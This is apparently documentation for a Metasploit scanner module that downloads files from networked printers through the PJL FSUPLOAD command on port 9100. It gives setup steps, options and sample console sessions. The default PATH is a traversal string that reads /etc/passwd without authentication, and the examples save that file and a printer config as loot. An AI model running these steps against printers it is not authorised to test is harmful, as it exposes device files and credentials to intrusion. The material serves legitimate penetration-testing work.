## Vulnerable Application

This module targets networked printers that expose the Printer Job Language (PJL) interface on TCP port 9100 (HP JetDirect / AppSocket). It uses the PJL `FSUPLOAD` command (which, in PJL nomenclature, uploads data from the device to the client) to retrieve a file from the printer's filesystem and store it as Metasploit loot.

The default `PATH` value (`0:\..\..\..\etc\passwd`) uses PJL path traversal to read the `/etc/passwd` file from the printer's underlying OS filesystem on devices where the PJL filesystem is mapped to the root. This technique is described in detail by the PRET project ([https://github.com/RUB-NDS/PRET](https://github.com/RUB-NDS/PRET)); this module is built on the Rex::Proto::PJL library, which draws from that research.

No authentication is required by default on most PJL implementations. Whether a given path is readable depends on the device firmware and filesystem permissions.

## Verification Steps

1. Start `msfconsole`
2. Do: `use auxiliary/scanner/printer/printer_download_file`
3. Do: `set RHOSTS [target IP or range]`
4. Optionally do: `set PATH [PJL path to the file]` (default: `0:\..\..\..\etc\passwd`)
5. Do: `run`
6. If the file is readable, the module saves it as loot under the `printer.file` type and prints the local loot path.

## Options

### RHOSTS

The target host(s) or range to scan. Accepts individual IPs, CIDR notation, or a file path prefixed with `file:`. Required.

### RPORT

The TCP port on which the printer's PJL/JetDirect interface is listening. (Default: `9100`)

### PATH

The PJL filesystem path to the file to download. Uses PJL volume-relative syntax; `\..\` traverses to parent directories. (Default: `0:\..\..\..\etc\passwd`, Required)

### THREADS

Number of concurrent scan threads. (Default: `1`)

## Scenarios

### Downloading /etc/passwd from a vulnerable printer

Example output (synthesized for documentation purposes; actual values will vary by device):

```
msf6 > use auxiliary/scanner/printer/printer_download_file
msf6 auxiliary(scanner/printer/printer_download_file) > set RHOSTS 192.168.1.45
RHOSTS => 192.168.1.45
msf6 auxiliary(scanner/printer/printer_download_file) > run

[+] 192.168.1.45:9100 - Saved 0:\..\..\..\etc\passwd as /home/user/.msf4/loot/20231115120000_default_192.168.1.45_printer.file_123456.bin
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### Downloading a printer configuration file

```
msf6 auxiliary(scanner/printer/printer_download_file) > set PATH 0:\config.cfg
PATH => 0:\config.cfg
msf6 auxiliary(scanner/printer/printer_download_file) > run

[+] 192.168.1.45:9100 - Saved 0:\config.cfg as /home/user/.msf4/loot/20231115120015_default_192.168.1.45_printer.file_789012.bin
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
